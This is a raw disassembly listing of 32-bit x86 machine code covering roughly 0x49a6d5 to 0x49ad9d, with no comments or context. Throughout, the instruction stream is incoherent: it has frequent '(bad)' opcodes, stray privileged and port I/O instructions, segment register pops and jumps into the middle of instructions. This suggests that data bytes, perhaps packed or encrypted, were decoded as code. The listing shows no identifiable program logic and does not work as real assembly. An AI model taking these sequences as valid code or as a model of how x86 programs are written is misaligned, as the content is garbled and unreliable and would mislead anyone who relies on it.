  49a6d5:	mov    edi,0x6b62832
  49a6da:	mov    ecx,DWORD PTR [edi]
  49a6dc:	jp     0x49a70d
  49a6de:	mov    bh,0x6a
  49a6e0:	sbb    eax,DWORD PTR [eax-0x41]
  49a6e3:	lahf   
  49a6e4:	jbe    0x49a752
  49a6e6:	rol    DWORD PTR [esi+0x349f07bf],0x7
  49a6ed:	push   0xffffffb2
  49a6ef:	add    esp,ebx
  49a6f1:	ds daa 
  49a6f3:	add    ah,ah
  49a6f5:	dec    eax
  49a6f6:	inc    edi
  49a6f7:	fbld   TBYTE PTR [edi-0x55383fc0]
  49a6fd:	out    dx,eax
  49a6fe:	dec    edi
  49a6ff:	pusha  
  49a700:	inc    ebp
  49a701:	mov    DWORD PTR [edx],ecx
  49a703:	iret   
  49a704:	pop    edi
  49a705:	fist   DWORD PTR [edx-0x6d]
  49a708:	sub    bh,bh
  49a70a:	inc    edi
  49a70b:	fild   WORD PTR [edx]
  49a70d:	push   esi
  49a70e:	imul   eax,edi,0x27
  49a711:	mov    ecx,DWORD PTR [eax]
  49a713:	or     BYTE PTR [ebx+eax*4-0x31],dh
  49a717:	xor    al,0x80
  49a719:	push   ebp
  49a71a:	or     BYTE PTR [edi],al
  49a71c:	xor    BYTE PTR [ecx-0x65c073a5],0xa7
  49a723:	aas    
  49a724:	pop    eax
  49a725:	ret    
  49a726:	(bad)
  49a72b:	add    ch,0x40
  49a72e:	add    esi,edi
  49a730:	(bad)  
  49a731:	xor    al,0x6c
  49a733:	add    DWORD PTR [edi-0x79],ebx
  49a736:	xor    eax,0x2076d327
  49a73b:	or     eax,0x7443417
  49a740:	punpcklwd mm6,DWORD PTR ds:0x5f5fc356
  49a747:	pusha  
  49a748:	aam    0x40
  49a74a:	add    BYTE PTR [edi-0x51],0xde
  49a74e:	adc    eax,0x43272027
  49a753:	lahf   
  49a754:	xor    al,0x80
  49a756:	inc    ecx
  49a757:	or     al,BYTE PTR [edi]
  49a759:	inc    esi
  49a75a:	adc    BYTE PTR [esi+0x7fcf4561],cl
  49a760:	xor    DWORD PTR [ecx+ecx*2-0x5a],esi
  49a764:	pop    eax
  49a765:	xchg   DWORD PTR [edi+eiz*8],esi
  49a768:	xor    al,0x20
  49a76a:	fdiv   DWORD PTR [esi-0x64]
  49a76d:	inc    esp
  49a76e:	ja     0x49a76f
  49a770:	pop    es
  49a771:	mov    esp,0x76dc341b
  49a776:	fild   QWORD PTR [esi]
  49a778:	xchg   esi,eax
  49a779:	aaa    
  49a77a:	add    BYTE PTR [eax-0x1e2069f6],dl
  49a780:	sub    DWORD PTR [ebp-0x55],eax
  49a783:	das    
  49a784:	aaa    
  49a785:	pop    ss
  49a786:	sub    al,0x71
  49a788:	loop   0x49a70a
  49a78a:	iret   
  49a78b:	xor    ebx,DWORD PTR [edi+0x21b20baf]
  49a791:	inc    ebx
  49a792:	xor    eax,0xed1f2f
  49a797:	mov    al,0x1
  49a799:	scas   eax,DWORD PTR es:[edi]
  49a79a:	fisttp WORD PTR [ecx+0x20]
  49a79d:	inc    esi
  49a79e:	jno    0x49a73f
  49a7a0:	sub    al,BYTE PTR [ebp+0x1]
  49a7a3:	stos   DWORD PTR es:[edi],eax
  49a7a4:	iret   
  49a7a5:	pshufw mm7,QWORD PTR [esp+eax*1+0x770b030b],0xe
  49a7ae:	xchg   esi,eax
  49a7af:	fdiv   QWORD PTR [eax+0x44]
  49a7b2:	pop    DWORD PTR [ebp+0x7]
  49a7b5:	(bad)  
  49a7b6:	(bad)  
  49a7b7:	mov    cl,0x1a
  49a7b9:	scas   eax,DWORD PTR es:[edi]
  49a7ba:	pop    ds
  49a7bb:	das    
  49a7bc:	xchg   esi,eax
  49a7bd:	sbb    al,0x55
  49a7bf:	sub    al,0x66
  49a7c1:	fbstp  TBYTE PTR [edx]
  49a7c3:	add    BYTE PTR [ecx],al
  49a7c5:	stos   DWORD PTR es:[edi],eax
  49a7c6:	loope  0x49a7ee
  49a7c8:	test   DWORD PTR [ebx-0x6045f3b8],0x203518f
  49a7d2:	push   esi
  49a7d3:	daa    
  49a7d4:	push   0xcb632ddb
  49a7d9:	mov    DWORD PTR [ebx],0x9b1d1c98
  49a7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49a7e0:	inc    esp
  49a7e1:	add    BYTE PTR [eax],ch
  49a7e3:	push   edi
  49a7e4:	ins    BYTE PTR es:[edi],dx
  49a7e5:	outs   dx,DWORD PTR ds:[esi]
  49a7e6:	inc    ebx
  49a7e7:	inc    edi
  49a7e8:	inc    ebp
  49a7e9:	aaa    
  49a7ea:	mov    BYTE PTR [edi+0x830cf2e],ch
  49a7f0:	sbb    eax,0xf570289
  49a7f5:	mov    eax,0x5e1ad750
  49a7fa:	das    
  49a7fb:	addr16 pusha 
  49a7fd:	ret    
  49a7fe:	mov    dh,0x6
  49a800:	ja     0x49a7b1
  49a802:	(bad)  
  49a803:	xor    al,0x6a
  49a805:	sbb    cl,ch
  49a807:	fild   QWORD PTR [esi]
  49a809:	pop    edi
  49a80a:	push   es
  49a80b:	sbb    eax,0x39370307
  49a810:	mov    edi,0x31ad3b8
  49a815:	xlat   BYTE PTR ds:[ebx]
  49a816:	daa    
  49a817:	inc    esi
  49a818:	push   ebp
  49a819:	mov    ebp,0xf7470c40
  49a81e:	daa    
  49a81f:	sbb    ecx,DWORD PTR [eax]
  49a821:	mov    esi,0x35079f88
  49a826:	xlat   BYTE PTR ds:[ebx]
  49a827:	sbb    ebx,DWORD PTR [eax+0x374f569a]
  49a82d:	fcomp  QWORD PTR [esi-0x6810aa4a]
  49a833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a834:	mov    edi,0x58082044
  49a839:	adc    al,0x17
  49a83b:	push   ecx
  49a83c:	rol    BYTE PTR [edx-0x75f8a82b],0x14
  49a843:	mov    eax,ds:0x3fc7bf66
  49a848:	jecxz  0x49a822
  49a84a:	mov    dh,0xdb
  49a84c:	out    0x39,eax
  49a84e:	addr16 (bad) 
  49a850:	aas    
  49a851:	xor    BYTE PTR cs:0x7f0f39bd,dh
  49a858:	inc    esp
  49a859:	jg     0x49a839
  49a85b:	push   ss
  49a85c:	adc    cl,0x87
  49a85f:	pop    es
  49a860:	dec    edi
  49a861:	arpl   WORD PTR [edx-0x4b],ax
  49a864:	sub    al,ah
  49a866:	inc    esi
  49a867:	(bad)  
  49a869:	test   BYTE PTR [edx],ah
  49a86b:	(bad)  
  49a86c:	iret   
  49a86d:	scas   eax,DWORD PTR es:[edi]
  49a86e:	xchg   edi,eax
  49a86f:	scas   al,BYTE PTR es:[edi]
  49a870:	outs   dx,BYTE PTR ds:[esi]
  49a871:	sbb    al,al
  49a873:	daa    
  49a874:	xor    al,BYTE PTR [esi]
  49a876:	and    DWORD PTR [edx+0x25],eax
  49a879:	aas    
  49a87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a87b:	and    BYTE PTR [ecx+0x55],0xb
  49a87f:	pop    es
  49a880:	jg     0x49a8f9
  49a882:	push   eax
  49a883:	mov    BYTE PTR [ebx+0x6d],ch
  49a886:	xor    edi,edx
  49a888:	dec    edi
  49a889:	pop    ss
  49a88a:	push   ss
  49a88b:	adc    esi,eax
  49a88d:	xchg   BYTE PTR [edi+0x1f],al
  49a890:	lea    edi,[eax+0xf335c71]
  49a896:	xchg   esi,eax
  49a897:	(bad)
  49a89b:	dec    eax
  49a89c:	fisttp WORD PTR [edi]
  49a89e:	pop    ds
  49a89f:	pop    eax
  49a8a0:	mov    al,0x1b
  49a8a2:	test   eax,0xae0827cf
  49a8a7:	push   0x1d
  49a8a9:	fild   QWORD PTR [edi-0x277bf8cb]
  49a8af:	shl    DWORD PTR [esi],0x57
  49a8b2:	push   edi
  49a8b3:	pop    edi
  49a8b4:	lods   eax,DWORD PTR ds:[esi]
  49a8b5:	loopne 0x49a8bd
  49a8b7:	add    al,0xa7
  49a8b9:	mov    edx,0x9755bc2e
  49a8be:	mov    bl,0x1f
  49a8c0:	cmp    BYTE PTR [ebx],ch
  49a8c2:	or     al,cl
  49a8c4:	mov    ds:0xac70757,al
  49a8c9:	xor    BYTE PTR [ebp+0x5d],ch
  49a8cc:	mov    bh,0xbf
  49a8ce:	xor    al,0xef
  49a8d0:	and    al,BYTE PTR ds:0xa0312e4c
  49a8d6:	push   eax
  49a8d7:	mov    ch,0x22
  49a8d9:	pop    edi
  49a8da:	out    0x5,eax
  49a8dc:	and    edx,DWORD PTR [esi-0xb]
  49a8df:	aaa    
  49a8e0:	aaa    
  49a8e1:	jg     0x49a887
  49a8e3:	or     BYTE PTR [ebx+0x32],0x45
  49a8e7:	xor    dl,BYTE PTR [ebx-0x3e]
  49a8ea:	inc    eax
  49a8eb:	dec    esp
  49a8ec:	dec    edi
  49a8ed:	xor    dh,BYTE PTR [ecx]
  49a8ef:	pusha  
  49a8f0:	push   ebp
  49a8f1:	mov    DWORD PTR [edi],ecx
  49a8f3:	aaa    
  49a8f4:	dec    DWORD PTR [edx+eax*4+0x57430ca7]
  49a8fb:	aaa    
  49a8fc:	xchg   ecx,eax
  49a8fd:	mov    dh,0xc
  49a8ff:	xor    al,0x2f
  49a901:	inc    esi
  49a902:	iret   
  49a903:	frstor [edx-0x46]
  49a906:	sbb    bh,BYTE PTR [edi+0x39]
  49a909:	das    
  49a90a:	push   ds
  49a90b:	fmul   DWORD PTR [eax-0x18488e93]
  49a911:	aas    
  49a912:	inc    esi
  49a913:	test   al,0x4a
  49a915:	fsub   QWORD PTR [edi+0x27]
  49a918:	mov    eax,0xb39d86b7
  49a91d:	xchg   DWORD PTR [bp+si+0x2b],edx
  49a921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49a922:	add    BYTE PTR [ebp-0x31],0x7f
  49a926:	push   edx
  49a927:	inc    eax
  49a928:	lods   eax,DWORD PTR ds:[esi]
  49a929:	add    edi,edi
  49a92b:	daa    
  49a92c:	inc    esi
  49a92d:	adc    BYTE PTR [eax+ebp*8+0x66],bl
  49a931:	das    
  49a932:	jg     0x49a908
  49a934:	inc    edx
  49a935:	lods   al,BYTE PTR ds:[esi]
  49a936:	sub    bh,BYTE PTR [edi+0x5f]
  49a939:	lods   al,BYTE PTR ds:[esi]
  49a93a:	push   0xffffffc5
  49a93c:	clc    
  49a93d:	(bad)  
  49a93e:	jmp    FWORD PTR [edi+0x11]
  49a941:	adc    edx,DWORD PTR [edi]
  49a943:	push   ss
  49a944:	pop    es
  49a945:	pop    ds
  49a946:	aaa    
  49a947:	aad    0x38
  49a949:	xchg   BYTE PTR [ecx+0x4207371f],ch
  49a94f:	(bad)  
  49a950:	mov    edx,0x2f6aab06
  49a955:	or     cl,BYTE PTR [edi+0x15]
  49a958:	mov    esp,0x638f3155
  49a95d:	pop    es
  49a95e:	ficom  WORD PTR [edx+0x317f8e23]
  49a964:	iret   
  49a965:	mov    edx,0x3f234d35
  49a96a:	aaa    
  49a96b:	call   FWORD PTR [esi+0x5a]
  49a96e:	xor    esp,DWORD PTR [ebp-0x14]
  49a971:	mov    edi,0x6c041f3
  49a976:	in     al,dx
  49a977:	xchg   edi,eax
  49a978:	(bad)  
  49a979:	xor    BYTE PTR [eax-0x5b],dl
  49a97c:	and    ah,BYTE PTR [edi+0x58034337]
  49a982:	test   eax,0xc2ff7fd5
  49a987:	jbe    0x49a94e
  49a989:	push   0x49cf3307
  49a98e:	add    esi,esp
  49a990:	sub    bh,BYTE PTR [edi-0x53bdf2ca]
  49a996:	cmp    cl,bh
  49a998:	xchg   DWORD PTR [edx],ebp
  49a99a:	(bad)  
  49a99b:	xor    dl,BYTE PTR [ebp+0xf]
  49a99e:	xor    ecx,DWORD PTR [edi+0x4]
  49a9a1:	xchg   DWORD PTR [ecx+esi*4-0x1],ecx
  49a9a5:	xor    bh,BYTE PTR [eax]
  49a9a7:	jg     0x49a936
  49a9a9:	test   BYTE PTR [eax+0x62a1b711],al
  49a9af:	dec    ebp
  49a9b0:	pop    eax
  49a9b1:	daa    
  49a9b2:	(bad)  
  49a9b3:	sbb    ch,BYTE PTR [edx+0x5f875336]
  49a9b9:	xor    al,BYTE PTR [ebx]
  49a9bb:	xchg   BYTE PTR [eax],ah
  49a9bd:	push   ebp
  49a9be:	inc    edi
  49a9bf:	xlat   BYTE PTR ds:[ebx]
  49a9c0:	ss mov bh,0x8c
  49a9c3:	push   ebp
  49a9c4:	and    BYTE PTR [ecx],al
  49a9c6:	push   edi
  49a9c7:	mov    BYTE PTR [esi-0x60e0aa97],al
  49a9cd:	xor    eax,0x2461551f
  49a9d2:	sub    eax,0x60a5bf56
  49a9d7:	lods   al,BYTE PTR ds:[esi]
  49a9d8:	imul   edx,DWORD PTR [edi-0x3ea556a9],0x4b
  49a9df:	pop    ss
  49a9e0:	pop    es
  49a9e1:	pop    ds
  49a9e2:	push   ss
  49a9e3:	add    eax,0x443890b8
  49a9e8:	pop    ds
  49a9e9:	lods   al,BYTE PTR ds:[esi]
  49a9ea:	and    ch,ch
  49a9ec:	push   es
  49a9ed:	out    dx,eax
  49a9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a9ef:	xchg   ebp,eax
  49a9f0:	rcr    dl,0x50
  49a9f3:	aas    
  49a9f4:	xor    BYTE PTR [edi-0x2d],dh
  49a9f7:	sbb    dl,BYTE PTR [ebp+0x58]
  49a9fa:	test   eax,0xd281777f
  49a9ff:	xor    DWORD PTR [ebx+0x3b],0x5c3fef96
  49aa06:	mov    DWORD PTR [edx],eax
  49aa08:	push   edi
  49aa09:	inc    esp
  49aa0a:	pop    edi
  49aa0b:	aas    
  49aa0c:	lods   al,BYTE PTR ds:[esi]
  49aa0d:	lods   eax,DWORD PTR ds:[esi]
  49aa0e:	sbb    eax,DWORD PTR [ebx]
  49aa10:	xor    ebp,DWORD PTR [edi-0x76fea761]
  49aa16:	push   ebp
  49aa17:	scas   eax,DWORD PTR es:[edi]
  49aa18:	push   edx
  49aa1a:	push   esi
  49aa1b:	shr    DWORD PTR [eax],0x7f
  49aa1e:	outs   dx,DWORD PTR ds:[esi]
  49aa1f:	out    dx,al
  49aa20:	cmp    DWORD PTR [esi+0x67062555],eax
  49aa26:	outs   dx,DWORD PTR ds:[esi]
  49aa27:	push   esi
  49aa28:	test   DWORD PTR [ebp+0x778f3701],esi
  49aa2e:	sub    esp,DWORD PTR [eax]
  49aa30:	adc    BYTE PTR [edx],cl
  49aa32:	iret   
  49aa33:	arpl   WORD PTR [edx],dx
  49aa35:	mov    eax,DWORD PTR [edx+0x45]
  49aa38:	dec    edi
  49aa39:	lahf   
  49aa3a:	mov    ds:0xc7829020,eax
  49aa3f:	aas    
  49aa40:	jns    0x49a9c7
  49aa42:	aam    0x80
  49aa44:	xor    ecx,DWORD PTR [edi-0x41]
  49aa47:	aaa    
  49aa48:	stos   DWORD PTR es:[edi],eax
  49aa49:	popa   
  49aa4a:	xor    eax,0x3b3fc743
  49aa4f:	push   esi
  49aa50:	inc    esp
  49aa51:	inc    edx
  49aa52:	out    0x97,eax
  49aa54:	mov    bh,0x6
  49aa56:	mov    ds:0x7f2e2751,eax
  49aa5b:	pop    eax
  49aa5c:	or     edx,DWORD PTR [esi-0x3f]
  49aa5f:	xchg   DWORD PTR [edi],eax
  49aa61:	pop    ebp
  49aa62:	sub    DWORD PTR [edx-0x54],0x217f0f57
  49aa69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49aa6a:	dec    ebp
  49aa6b:	or     BYTE PTR [edi+0x61049baf],ch
  49aa71:	add    eax,0x40356b17
  49aa76:	mov    eax,ds:0xb3374f4b
  49aa7b:	ss pop ebp
  49aa7d:	adc    DWORD PTR [edi+0x32],0xc35ff77
  49aa84:	bound  ebx,QWORD PTR es:[edi+0xf]
  49aa88:	ret    
  49aa89:	dec    esp
  49aa8a:	les    ebp,FWORD PTR [eax-0x4b65cc11]
  49aa90:	pusha  
  49aa91:	adc    eax,0xaa4f07af
  49aa96:	arpl   WORD PTR [eax],sp
  49aa98:	test   DWORD PTR [esi+0x37],edx
  49aa9b:	and    eax,0xdfc0a864
  49aaa0:	xor    edx,DWORD PTR [ecx-0x50]
  49aaa3:	or     bl,dh
  49aaa5:	mov    eax,DWORD PTR ds:[edi]
  49aaa8:	xchg   DWORD PTR [ecx],edx
  49aaaa:	test   ch,dl
  49aaac:	mov    eax,ds:0x5a056fff
  49aab1:	adc    BYTE PTR [edx-0x69],ah
  49aab4:	outs   dx,DWORD PTR ds:[esi]
  49aab5:	call   0x57a9d712
  49aaba:	dec    edi
  49aabb:	lods   eax,DWORD PTR ds:[esi]
  49aabc:	sub    dl,BYTE PTR [ebx+0x40]
  49aabf:	push   edi
  49aac0:	mov    esp,0xcf06b01b
  49aac5:	(bad)  
  49aac6:	cmp    BYTE PTR [esi-0x9cfdccd],dh
  49aacc:	xchg   bh,dl
  49aace:	scas   eax,DWORD PTR es:[edi]
  49aacf:	iret   
  49aad0:	or     al,0x1
  49aad2:	stos   DWORD PTR es:[edi],eax
  49aad3:	push   0xffffffff
  49aad5:	dec    edx
  49aad6:	xor    DWORD PTR [eax],eax
  49aad8:	cmp    esp,DWORD PTR [edi]
  49aada:	daa    
  49aadb:	and    BYTE PTR ss:[edi+ebx*4],ah
  49aadf:	xor    ecx,DWORD PTR cs:[edi+0x48]
  49aae3:	ins    BYTE PTR es:[edi],dx
  49aae4:	inc    ecx
  49aae5:	test   DWORD PTR [edi-0x21],esi
  49aae8:	sbb    dh,BYTE PTR [esi+0x41]
  49aaeb:	js     0x49aaec
  49aaed:	(bad)  
  49aaef:	lds    esp,FWORD PTR [ebp+0x3457c1a5]
  49aaf5:	mov    DWORD PTR [ecx],0x7f85d60b
  49aafb:	dec    edi
  49aafc:	push   0xffffffc5
  49aafe:	mov    ch,0x6e
  49ab00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ab01:	iret   
  49ab02:	or     BYTE PTR [eax+0x18],bh
  49ab05:	test   eax,0x6d583a3f
  49ab0a:	push   ecx
  49ab0b:	sub    al,0xa7
  49ab0d:	outs   dx,DWORD PTR ds:[esi]
  49ab0e:	lods   al,BYTE PTR ds:[esi]
  49ab0f:	push   cs
  49ab10:	lods   al,BYTE PTR ds:[esi]
  49ab11:	cdq    
  49ab12:	lahf   
  49ab13:	call   DWORD PTR [eax]
  49ab15:	lods   al,BYTE PTR ds:[esi]
  49ab16:	mov    ss,WORD PTR [ecx]
  49ab18:	lahf   
  49ab19:	pop    es
  49ab1a:	jmp    FWORD PTR [esi+0x381ce022]
  49ab20:	jg     0x49ab67
  49ab22:	sbb    BYTE PTR [esi],dl
  49ab24:	sub    al,0x2a
  49ab26:	dec    edi
  49ab27:	pop    es
  49ab28:	outs   dx,DWORD PTR ds:[esi]
  49ab29:	pusha  
  49ab2a:	repnz or eax,DWORD PTR [ebx]
  49ab2d:	das    
  49ab2e:	xor    DWORD PTR [ebx],ebp
  49ab30:	adc    BYTE PTR [edi-0x37b790d7],ah
  49ab36:	add    esi,DWORD PTR [esi-0x49]
  49ab39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ab3a:	inc    ecx
  49ab3b:	sub    eax,0x9f99a345
  49ab40:	outs   dx,DWORD PTR ds:[esi]
  49ab41:	add    edx,DWORD PTR [eax-0x68738f56]
  49ab47:	(bad)
  49ab4b:	adc    BYTE PTR [edi],al
  49ab4d:	xor    DWORD PTR [eax],edx
  49ab4f:	sub    cl,BYTE PTR [edx+0x17]
  49ab52:	xchg   ebx,eax
  49ab53:	(bad)  
  49ab54:	pusha  
  49ab55:	push   ebx
  49ab56:	call   0x4281:0x772fc72e
  49ab5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ab5e:	and    edi,esi
  49ab60:	fbld   TBYTE PTR [ecx+0x62]
  49ab63:	aam    0x45
  49ab65:	xor    eax,0xea1838cf
  49ab6a:	ret    0x27ad
  49ab6d:	cmp    bl,bh
  49ab6f:	inc    edx
  49ab70:	enter  0x42ad,0x2b
  49ab74:	pop    es
  49ab75:	mov    edi,0x2a39c17
  49ab7a:	lods   al,BYTE PTR ds:[esi]
  49ab7b:	idiv   DWORD PTR [edi+0x42]
  49ab7e:	add    bl,BYTE PTR [ebx+ecx*4+0x2e]
  49ab82:	(bad)  
  49ab83:	fild   WORD PTR [ebp+0x4fab0aa1]
  49ab89:	ja     0x49abbe
  49ab8b:	xlat   BYTE PTR ds:[ebx]
  49ab8c:	xor    eax,DWORD PTR [ecx-0x20d030ab]
  49ab92:	or     dl,BYTE PTR [esi+0x21]
  49ab95:	inc    esi
  49ab96:	addr16 pop edi
  49ab98:	adc    BYTE PTR [ebp+0x4b],ch
  49ab9b:	xchg   BYTE PTR ds:0x5a1278f,dh
  49aba1:	or     esi,DWORD PTR [esi+0x45]
  49aba4:	call   FWORD PTR [edi-0x29]
  49aba7:	adc    BYTE PTR [edx+ebx*8-0x41],cl
  49abab:	aas    
  49abac:	xlat   BYTE PTR ss:[ebx]
  49abae:	mov    cl,0x49
  49abb0:	fwait
  49abb1:	push   ss
  49abb2:	jg     0x49aba7
  49abb4:	lods   al,BYTE PTR ds:[esi]
  49abb5:	push   0x5
  49abb7:	fwait
  49abb8:	pop    ss
  49abb9:	pop    es
  49abba:	inc    DWORD PTR [ebx]
  49abbc:	push   ebp
  49abbd:	and    al,0x26
  49abbf:	pop    ds
  49abc0:	dec    edi
  49abc1:	inc    ecx
  49abc2:	add    BYTE PTR [esi-0x74],dl
  49abc5:	cmp    bh,dl
  49abc7:	or     al,0x74
  49abc9:	lods   al,BYTE PTR ds:[esi]
  49abca:	dec    eax
  49abcb:	aas    
  49abcc:	out    dx,eax
  49abcd:	imul   edx,DWORD PTR ss:[ebx+0x8],0xffffff96
  49abd2:	pop    es
  49abd3:	daa    
  49abd4:	sbb    BYTE PTR [ebp-0x75],0x8e
  49abd8:	out    dx,eax
  49abd9:	inc    ebp
  49abda:	xchg   DWORD PTR [edi],ecx
  49abdc:	cmp    BYTE PTR [edx],ah
  49abde:	or     eax,0x6f431f79
  49abe3:	inc    esi
  49abe4:	push   0x2c
  49abe6:	dec    eax
  49abe7:	(bad)
  49abea:	lahf   
  49abeb:	mov    WORD PTR ds:0xf0fba118,?
  49abf1:	jbe    0x49ac56
  49abf3:	inc    ecx
  49abf4:	out    0x5f,eax
  49abf6:	jg     0x49ac28
  49abf8:	popa   
  49abf9:	test   ch,al
  49abfb:	call   DWORD PTR [edx+0x2b1aadef]
  49ac01:	pop    eax
  49ac02:	pop    es
  49ac03:	lahf   
  49ac04:	push   0xffffffda
  49ac06:	mov    ch,0xea
  49ac08:	pop    ds
  49ac09:	out    dx,eax
  49ac0a:	fild   QWORD PTR [edi-0x23d554a5]
  49ac10:	scas   al,BYTE PTR es:[edi]
  49ac11:	lahf   
  49ac12:	add    ch,BYTE PTR [esi+0x46e7ab82]
  49ac18:	pop    es
  49ac19:	ss or  eax,0xff1b144a
  49ac1f:	fisttp WORD PTR [ecx-0x55]
  49ac22:	adc    ah,BYTE PTR [ebx+0x2b013f92]
  49ac28:	and    BYTE PTR [ecx+0x7974437],0xb0
  49ac2f:	xor    BYTE PTR ds:0x51170717,0x60
  49ac36:	add    eax,0x2f1f6742
  49ac3b:	add    al,0x3a
  49ac3d:	push   ss
  49ac3e:	scas   eax,DWORD PTR es:[edi]
  49ac3f:	mov    ds:0x45580b05,al
  49ac44:	aas    
  49ac45:	rcl    BYTE PTR [ebx],0x8c
  49ac48:	aad    0x7f
  49ac4a:	jg     0x49ac9f
  49ac4c:	or     al,BYTE PTR [edx+0x58]
  49ac4f:	pop    edi
  49ac50:	dec    ebx
  49ac52:	adc    eax,0x38af4235
  49ac57:	lods   al,BYTE PTR ds:[esi]
  49ac58:	push   es
  49ac59:	lods   eax,DWORD PTR ds:[esi]
  49ac5a:	or     DWORD PTR [edi],ecx
  49ac5c:	iret   
  49ac5d:	mov    cl,BYTE PTR [ebx]
  49ac5f:	and    DWORD PTR [edx],esp
  49ac61:	out    0x8f,eax
  49ac63:	or     BYTE PTR [ecx-0xc913e43],dh
  49ac69:	xchg   edi,eax
  49ac6b:	push   ebp
  49ac6c:	dec    eax
  49ac6d:	test   eax,0x16bf8fa5
  49ac72:	mov    WORD PTR [esi-0x6fb3f080],es
  49ac78:	sub    BYTE PTR [ecx],0xcf
  49ac7b:	xor    eax,0x40ec1737
  49ac80:	inc    ebx
  49ac81:	xor    ch,BYTE PTR [edi+0x7f]
  49ac84:	xor    al,0xab
  49ac86:	push   es
  49ac87:	xor    DWORD PTR [eax+0x6f],ebp
  49ac8a:	outs   dx,DWORD PTR ds:[esi]
  49ac8b:	sub    eax,0x570120a8
  49ac90:	mov    bh,0x89
  49ac92:	shr    BYTE PTR [ebx-0x59],cl
  49ac95:	xor    al,0x7f
  49ac97:	pop    ss
  49ac98:	push   ecx
  49ac99:	or     BYTE PTR [edx],al
  49ac9b:	into   
  49ac9c:	inc    edx
  49ac9d:	mov    bh,0x58
  49ac9f:	add    esi,DWORD PTR [eax+0x2d6f3f63]
  49aca5:	push   eax
  49aca6:	test   al,0x48
  49aca8:	iret   
  49aca9:	(bad)  
  49acab:	push   eax
  49acac:	sub    al,0x26
  49acae:	out    dx,eax
  49acaf:	scas   eax,DWORD PTR es:[edi]
  49acb0:	inc    esi
  49acb1:	jg     0x49ac6b
  49acb3:	ins    BYTE PTR es:[edi],dx
  49acb4:	je     0x49ad18
  49acb6:	iret   
  49acb7:	call   DWORD PTR [edx]
  49acb9:	mov    ds:0xe7156021,eax
  49acbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49acbf:	mov    eax,0x6f408418
  49acc4:	xor    BYTE PTR [eax],ch
  49acc6:	dec    edx
  49acc7:	adc    DWORD PTR [ebx-0x11],ecx
  49acca:	iret   
  49accb:	and    eax,0xf56a147
  49acd0:	into   
  49acd1:	cmp    DWORD PTR [ebx+0x6f6806b4],ebp
  49acd7:	xchg   edi,eax
  49acd8:	adc    cl,BYTE PTR ds:0xf730a6ba
  49acde:	xor    edi,DWORD PTR [edi]
  49ace0:	pop    edx
  49ace1:	xchg   esp,eax
  49ace2:	ret    0xf13
  49ace5:	pop    es
  49ace6:	xchg   ecx,eax
  49ace7:	inc    edx
  49ace8:	sbb    eax,0x9f34475c
  49aced:	pop    edx
  49acee:	or     al,BYTE PTR [ebp+0x2fc6ffcb]
  49acf4:	scas   eax,DWORD PTR es:[edi]
  49acf5:	inc    edi
  49acf6:	rcr    DWORD PTR [edx],0xb0
  49acf9:	lahf   
  49acfa:	xchg   DWORD PTR [edi],esi
  49acfc:	xchg   BYTE PTR [esi],dh
  49acfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49acff:	push   ebx
  49ad00:	pxor   mm1,QWORD PTR [ebx]
  49ad03:	lods   al,BYTE PTR ss:[esi]
  49ad05:	ficomp DWORD PTR [edi-0x31]
  49ad08:	pop    es
  49ad09:	mov    al,0xaa
  49ad0b:	and    DWORD PTR [ecx],eax
  49ad0d:	outs   dx,DWORD PTR ds:[esi]
  49ad0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ad0f:	lods   ax,WORD PTR ds:[esi]
  49ad11:	mov    ah,0xef
  49ad13:	aas    
  49ad14:	rcl    BYTE PTR [eax-0x58],0x15
  49ad18:	iret   
  49ad19:	push   edi
  49ad1a:	inc    ebx
  49ad1b:	mov    BYTE PTR [ecx],cl
  49ad1d:	dec    edx
  49ad1e:	inc    ecx
  49ad1f:	das    
  49ad20:	xor    dl,BYTE PTR [ebx]
  49ad22:	sub    eax,DWORD PTR [eax]
  49ad24:	push   edx
  49ad25:	(bad)  
  49ad26:	aas    
  49ad27:	add    BYTE PTR [ebx],bl
  49ad29:	(bad)  
  49ad2a:	or     BYTE PTR [ebx-0x7b374659],bl
  49ad30:	adc    al,0x5e
  49ad32:	inc    ebx
  49ad33:	xor    bl,BYTE PTR [ebx]
  49ad35:	push   ecx
  49ad36:	loope  0x49acba
  49ad38:	jecxz  0x49ad5d
  49ad3a:	pop    edi
  49ad3b:	inc    ecx
  49ad3c:	fisttp WORD PTR [eax]
  49ad3e:	inc    ecx
  49ad3f:	mov    al,ds:0x8076720
  49ad44:	fsubr  QWORD PTR [esi+0x4f37771b]
  49ad4a:	inc    esp
  49ad4b:	cdq    
  49ad4c:	sub    edx,edx
  49ad4e:	push   esp
  49ad4f:	push   DWORD PTR [ecx]
  49ad51:	(bad)  
  49ad52:	aaa    
  49ad53:	nop
  49ad54:	invd   
  49ad56:	dec    DWORD PTR ss:[edi]
  49ad59:	cmp    DWORD PTR [eax],eax
  49ad5b:	xor    dl,BYTE PTR [eax+0x7030580]
  49ad61:	mov    eax,ds:0xcfdd5800
  49ad66:	pop    edi
  49ad67:	fadd   st(0),st
  49ad69:	dec    edx
  49ad6a:	dec    eax
  49ad6b:	xlat   BYTE PTR ds:[ebx]
  49ad6c:	ja     0x49ad9b
  49ad6e:	sbb    al,BYTE PTR [ebp+eax*2-0x474bf789]
  49ad75:	inc    eax
  49ad76:	push   DWORD PTR [edi-0x38a7fa96]
  49ad7c:	lahf   
  49ad7d:	dec    edi
  49ad7e:	xchg   BYTE PTR [ebp+0x4f5fb15c],dl
  49ad84:	inc    ebx
  49ad85:	aas    
  49ad86:	shl    BYTE PTR [eax+0xf43a990],cl
  49ad8c:	and    eax,0x8e9c3057
  49ad91:	iret   
  49ad92:	inc    ecx
  49ad93:	fisubr DWORD PTR [eax-0x2818533f]
  49ad99:	push   ss
  49ad9a:	shr    DWORD PTR [ebp+0x6a],cl
  49ad9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
